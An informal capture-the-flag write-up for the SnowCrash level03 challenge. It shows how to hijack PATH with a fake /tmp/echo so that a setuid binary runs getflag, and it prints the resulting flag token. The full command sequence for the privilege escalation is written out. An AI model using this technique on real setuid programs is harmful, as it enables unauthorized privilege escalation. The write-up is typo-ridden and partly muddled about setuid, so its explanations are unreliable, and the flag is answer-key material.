As always we first ls -la to see what is all given to us and the permissions that is given with it
level03@SnowCrash:~$ ls -la

# Notice the important part in the rights of level03. It uses suid which is a massive danger and this is out gate way into the system. It shares
	user rights with us and will allow us to use the getflag command. As this give us elevated user rights and allows us to exploit it.
	It allows to run the programm as elevated rights, making it run as the user.

we see that we have an executable. we will run it and see what happens 
evel03@SnowCrash:~$ ./level03 
Exploit me

we see that it prints out 'Exploit me'.
So now we will do just that.

if we look at the executable level03 in terms of what strings shows us. We can see that the binary use `/usr/bin/env 
		echo 'Exploit me' to print Exploit me we can change the location of echo with a fake one that will provide use
		with the command getflag, because ./level03 does have the right of flag03 user

 using the exploit od suid :
 we see that there os a getflag command
level03@SnowCrash:~$ echo '/bin/get
getfacl           getflag           get_mountoptions  
 level03@SnowCrash:~$ ls -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag  #Has the following rights

So we will make our own echo
 echo '/bin/getflag' > /tmp/echo;

 Now we have to give rights to the echo we made
 chmod +x /tmp/echo;
level03@SnowCrash:~$ ls -la /tmp/echo
-rwxrwxr-x 1 level03 level03 13 Oct 23 13:06 /tmp/echo #Now has Full rights to make it executable

We have to change the PATH now to out PATH we want
export PATH=/tmp:$PATH;

run the executable now and you get
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
